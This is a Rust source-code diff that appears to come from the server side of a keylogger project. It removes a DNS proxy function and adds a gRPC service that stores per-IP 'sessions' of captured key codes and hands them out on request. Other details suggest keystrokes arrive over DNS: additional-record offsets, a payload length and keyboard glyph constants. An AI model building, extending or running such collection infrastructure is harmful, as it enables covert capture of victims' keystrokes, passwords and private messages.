@@ -9,19 +9,23 @@ use std::{
     net::{Ipv4Addr, SocketAddr},
     process::Command,
     str::FromStr,
-    sync::OnceLock,
+    sync::Arc,
 };
 
 use anyhow::Error;
-use handlers::{dns_proxy::DnsProxy, grpc::greeter::MyGreeter};
+use handlers::grpc::greeter::MyGreeter;
 use log::{debug, info};
 use serde::Deserialize;
-use tonic::transport::Server;
+use tokio::sync::Mutex;
+use tonic::{transport::Server, Request, Response, Status};
 
-use crate::handlers::grpc::tamanoir::greeter_server::GreeterServer;
+use crate::handlers::grpc::tamanoir_grpc::{
+    greeter_server::GreeterServer,
+    proxy_server::{Proxy, ProxyServer},
+    NoArgs, SessionResponse, SessionsResponse,
+};
 
 const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
-static KEYMAPS: OnceLock<HashMap<u8, KeyMap>> = OnceLock::new();
 const AR_COUNT_OFFSET: usize = 10;
 const AR_HEADER_LEN: usize = 12;
 const FOOTER_TXT: &str = "r10n4m4t/";
@@ -251,19 +255,55 @@ struct PackageMetadata {
     name: String,
 }
 
-pub async fn serve_tonic() -> anyhow::Result<()> {
+type SessionsState = Arc<Mutex<HashMap<Ipv4Addr, Session>>>;
+#[derive(Clone)]
+pub struct SessionsStore {
+    pub sessions: SessionsState,
+}
+impl SessionsStore {
+    pub fn new() -> Self {
+        Self {
+            sessions: Arc::new(Mutex::new(HashMap::new())),
+        }
+    }
+}
+
+#[tonic::async_trait]
+impl Proxy for SessionsStore {
+    async fn get_sessions(
+        &self,
+        request: Request<NoArgs>,
+    ) -> Result<Response<SessionsResponse>, Status> {
+        debug!(
+            "<get_sessions> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
+            self.sessions.lock().await;
+
+        let mut sessions: Vec<SessionResponse> = vec![];
+        for s in current_sessions.values().into_iter() {
+            sessions.push(SessionResponse {
+                ip: s.ip.to_string(),
+                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
+            })
+        }
+
+        let reply = SessionsResponse { sessions };
+        Ok(Response::new(reply))
+    }
+}
+
+pub async fn serve_tonic(sessions: SessionsStore) -> anyhow::Result<()> {
     let addr = "[::1]:50051".parse().unwrap();
     let greeter = MyGreeter::default();
+
     info!("Starting grpc server");
     debug!("Grpc server is listning on  [::1]:50051");
     Server::builder()
         .add_service(GreeterServer::new(greeter))
+        .add_service(ProxyServer::new(sessions))
         .serve(addr)
         .await?;
-    Ok(())
-}
-pub async fn serve_proxy(port: u16, dns_ip: Ipv4Addr, payload_len: usize) -> anyhow::Result<()> {
-    info!("Starting dns proxy server");
-    DnsProxy::new(port, dns_ip, payload_len).serve().await?;
     Ok(())
 }
